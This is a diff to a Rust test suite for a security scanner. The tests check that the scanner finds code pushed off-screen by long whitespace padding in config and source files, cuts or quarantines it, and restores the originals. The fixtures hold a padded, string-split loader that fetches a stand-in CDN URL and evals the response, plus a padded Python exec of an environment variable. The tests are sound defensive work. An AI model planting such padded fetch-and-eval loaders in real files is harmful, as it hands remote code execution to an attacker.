@@ -337,26 +337,30 @@ fn loader_wave_variants() {
     };
     assert_eq!(
         names("neutralized"),
-        ["babel.config.js", "eslint.config.js", "jest.config.js"]
+        [
+            "babel.config.js",
+            "eslint.config.js",
+            "jest.config.js",
+            "postcss.config.js"
+        ]
     );
     // everything it can't cut cleanly is quarantined: no manual review
     let mut q = names("quarantined");
     q.sort();
     assert_eq!(
         q,
-        [
-            ".env",
-            "fetch-assets.js",
-            "helper.js",
-            "postcss.config.js",
-            "postinstall.js"
-        ]
+        [".env", "fetch-assets.js", "helper.js", "postinstall.js"]
     );
     assert_eq!(names("system"), Vec::<String>::new());
     assert!(!repo.join("scripts/postinstall.js").exists());
     assert_eq!(
         text(&std::fs::read(repo.join("jest.config.js")).unwrap()),
         "/** @type {import('jest').Config} */\nmodule.exports = {\n  testEnvironment: 'node',\n  roots: ['<rootDir>/src'],\n};\n"
+    );
+    // a novel marker is still cut by the padding alone
+    assert_eq!(
+        text(&std::fs::read(repo.join("postcss.config.js")).unwrap()),
+        "module.exports = { plugins: {} };\n"
     );
     let rescan = g(&tmp, &["scan", &s(&repo), "--json"]).run();
     let rescan = parse_json(&rescan.stdout);
@@ -415,6 +419,116 @@ fn loader_wave_near_misses() {
     assert_eq!(out.code, 0, "{}", out.shown_all());
     let av = g(&tmp, &["av", "scan", &s(&repo)]).run();
     assert!(!av.stdout.contains("js-loader-marker"), "{}", av.stdout);
+}
+
+/// Code pushed off-screen by 150+ blanks is caught by the padding alone,
+/// whatever it is named and however its strings are split; `clean` cuts it
+/// out and keeps the real file, and `restore` brings the original back.
+#[test]
+fn hidden_padded_code() {
+    let tmp = Tmp::new("hidden-code");
+    let repo = tmp.join("repo");
+    let pad = " ".repeat(240);
+    let tabs = "\t".repeat(160);
+    // normal-looking names, split strings, no marker, no _0x
+    let hidden = concat!(
+        "(async()=>{const cfg=['ht','tps://','cdn.example.invalid'].join('');",
+        "const r=await fetch(cfg);const run=globalThis['ev'+'al'];run(await r.text())})();"
+    );
+    let jest = "module.exports = {\n  testEnvironment: 'node',\n};";
+    let files = [
+        ("jest.config.js", format!("{jest}{pad}{hidden}\n")),
+        (
+            "vite.config.ts",
+            format!("export default {{}};{tabs}{hidden}\nconsole.log('ok');\n"),
+        ),
+        ("src/util.js", format!("a();\n{pad}{hidden}\nb();\n")),
+        (
+            "tools/setup.py",
+            format!("import os{pad}exec(os.environ['X'])\n"),
+        ),
+    ];
+    for (name, body) in &files {
+        write(&repo.join(name), body);
+    }
+    let before = std::fs::read(repo.join("jest.config.js")).unwrap();
+    let out = g(&tmp, &["scan", &s(&repo), "--json"]).run();
+    assert_eq!(out.code, 1, "{}", out.stdout);
+    let found: Vec<String> = parse_json(&out.stdout)["tree"]["fingerprint"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| {
+            format!(
+                "{} {} {}",
+                f["where"].as_str().unwrap().replace('\\', "/"),
+                f["sig_id"].as_str().unwrap(),
+                f["evidence"].as_str().unwrap_or("")
+            )
+        })
+        .collect();
+    for (name, _) in &files {
+        let want = format!("{name} hidden.padded.code");
+        assert!(
+            found.iter().any(|f| f.starts_with(&want)),
+            "{want} not in {found:#?}"
+        );
+    }
+    // the evidence shows the hidden code, not 240 blanks
+    assert!(
+        found.iter().any(|f| f.contains("[240 blanks](async()=>")),
+        "{found:#?}"
+    );
+
+    let out = g(&tmp, &["clean", &s(&repo)]).run();
+    assert_eq!(out.code, 0, "{}", out.shown_all());
+    let read = |n: &str| text(&std::fs::read(repo.join(n)).unwrap());
+    assert_eq!(read("jest.config.js"), format!("{jest}\n"));
+    assert_eq!(
+        read("vite.config.ts"),
+        "export default {};\nconsole.log('ok');\n"
+    );
+    assert_eq!(read("src/util.js"), "a();\nb();\n");
+    // no in-place cut for other languages: quarantined (backed up)
+    assert!(!repo.join("tools/setup.py").exists());
+    let rescan = g(&tmp, &["scan", &s(&repo)]).run();
+    assert_eq!(rescan.code, 0, "{}", rescan.shown_all());
+
+    let out = g(&tmp, &["restore", &s(&repo.join("jest.config.js"))]).run();
+    assert_eq!(out.code, 0, "{}", out.shown_all());
+    assert_eq!(std::fs::read(repo.join("jest.config.js")).unwrap(), before);
+}
+
+/// Long blanks that hide nothing stay clean: aligned comments, trailing
+/// blanks, deep indentation, blanks inside a binary table, files that are
+/// not scripts, and a Windows batch file that pads on purpose (the Google
+/// Cloud SDK installer does this after `@rem`).
+#[test]
+fn hidden_padded_code_near_misses() {
+    let tmp = Tmp::new("hidden-code-clean");
+    let repo = tmp.join("repo");
+    let pad = " ".repeat(240);
+    let indent = " ".repeat(140);
+    let tabs = "\t".repeat(300);
+    for (name, body) in [
+        ("a.js", format!("module.exports = {{}};{pad}// note\n")),
+        ("b.js", format!("module.exports = {{}};{pad}/// note\n")),
+        ("c.js", format!("module.exports = {{}};{pad}\n")),
+        ("d.ts", format!("function f() {{\n{indent}return 1;\n}}\n")),
+        ("e.js", format!("var t = '\u{2}{tabs}\u{3}';\n")),
+        ("f.py", format!("x = 1{pad}# note\n")),
+        ("g.js", format!("var x = 1;{}y();\n", " ".repeat(149))),
+        ("notes.md", format!("| a |{pad}b |\n")),
+        ("data.json", format!("{{\"a\": 1{pad}}}\n")),
+        (
+            "install.bat",
+            format!("@rem{pad}( IF NOT _%X%_==__ CHCP %X% >NUL )\n"),
+        ),
+    ] {
+        write(&repo.join(name), body);
+    }
+    let out = g(&tmp, &["scan", &s(&repo)]).run();
+    assert_eq!(out.code, 0, "{}", out.shown_all());
 }
 
 #[test]
